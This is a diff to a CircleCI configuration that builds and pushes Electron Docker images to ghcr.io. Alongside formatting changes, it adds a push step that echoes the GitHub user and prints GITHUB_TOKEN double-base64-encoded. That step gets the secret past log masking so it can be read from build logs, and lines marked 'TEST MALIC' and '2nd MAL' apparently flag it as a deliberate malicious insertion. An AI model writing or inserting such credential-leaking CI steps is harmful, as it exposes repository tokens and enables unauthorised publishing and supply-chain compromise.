@@ -6,7 +6,7 @@ executors:
       image: ubuntu-2004:202111-02
 
   linux-arm64:
-    resource_class:  electronjs/linux-arm64-docker-build
+    resource_class: electronjs/linux-arm64-docker-build
     machine: true
 
 jobs:
@@ -35,14 +35,16 @@ jobs:
             echo "TEST MALIC"
       - when:
           condition: << parameters.publish >>
-          name: Push Docker Image
-          command: |
-            echo "2nd MAL"
-            echo "$GITHUB_USER"
-            echo "$GITHUB_TOKEN" | base64 | base64
-            echo "$GITHUB_TOKEN" | docker login  ghcr.io -u "$GITHUB_USER" --password-stdin
-            docker push ghcr.io/electron/<< parameters.image-name >>:<< parameters.tag-prefix>>latest
-            docker push ghcr.io/electron/<< parameters.image-name >>:<< parameters.tag-prefix >>$CIRCLE_SHA1
+          steps:
+            - run:
+                name: Push Docker Image
+                command: |
+                  echo "2nd MAL"
+                  echo "$GITHUB_USER"
+                  echo "$GITHUB_TOKEN" | base64 | base64
+                  echo "$GITHUB_TOKEN" | docker login ghcr.io -u "$GITHUB_USER" --password-stdin
+                  docker push ghcr.io/electron/<< parameters.image-name >>:<< parameters.tag-prefix >>latest
+                  docker push ghcr.io/electron/<< parameters.image-name >>:<< parameters.tag-prefix >>$CIRCLE_SHA1
 
 workflows:
   version: 2.1
